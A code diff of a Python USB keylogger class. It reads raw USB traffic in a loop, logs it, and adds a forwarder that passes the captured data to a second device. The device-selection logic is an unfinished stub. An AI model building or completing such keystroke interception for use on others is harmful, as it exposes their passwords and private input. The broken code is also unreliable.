@@ -1,28 +1,54 @@
 import logging
-
+from typing import Optional
 import usb.core, usb.util
 from src import DataHandler
+from src.USBForwarder import USBForwarder
+
+
+class NoDeviceFound(Exception):
+    def __init__(self, devices: list = []):
+        super().__init__(f"No forward device found in {devices}")
 
 
 class KeyLogger:
-    __slots__ = ["__devices", "data_handler"]
+    __slots__ = ["__devices", "data_handler", "__USBForwarder"]
 
     def __init__(self, data_handler: DataHandler) -> None:
         self.__devices: list = self.get_devices()
         self.data_handler = data_handler
+        self.__USBForwarder = USBForwarder(self.__find_device(with_device="forward"))
 
     def __del__(self):
         pass
 
+    def __find_device(self, with_device: str = "forward") -> Optional[usb.core.Device]:
+        id_vendor: int = 0
+        device_id: int = 0
+        for device in self.__devices:
+            # TODO set right device here
+            print(device)
+            if with_device == "forward":
+                pass
+            elif with_device == "receive":
+                pass
+        if id_vendor == 0 or device_id == 0:
+            # raise NoDeviceFound(self.__devices)
+            pass
+        else:
+            device: Optional[usb.core.Device] = usb.core.find(
+                idVendor=id_vendor, idProduct=device_id
+            )
+        return device
+
     @staticmethod
     def get_devices() -> list[[int, int]]:
         devices = usb.core.find(find_all=True)
-        vendor_ids: list[(int, int)] = []
+        vendor_ids: list[[int, int]] = []
         # Enumerate over all USB devices
         for device in devices:
             try:
-                tuple [int,int] = device.idVendor, device.idProduct
-                vendor_ids.append(tuple)
+                object: list[int, int] = [device.idVendor, device.idProduct]
+                vendor_ids.append(object)
             except usb.core.USBError as e:
                 print(f"Error reading Vendor ID: {e}")
         return vendor_ids
@@ -47,8 +73,10 @@ class KeyLogger:
         try:
             # Endlosschleife zum Abhören des USB-Verkehrs
             while True:
-                data: any = dev.read(0x81, 64)  # Endpoint-Adresse und Puffergröße anpassen
-                # Hier können Sie mit den USB-Daten weiterarbeiten
+                data: any = dev.read(
+                    0x81, 64
+                )  # Endpoint-Adresse und Puffergröße anpassen
+                self.__USBForwarder.send_data(data)
                 self.data_handler.write(data)
         except KeyboardInterrupt:
             pass
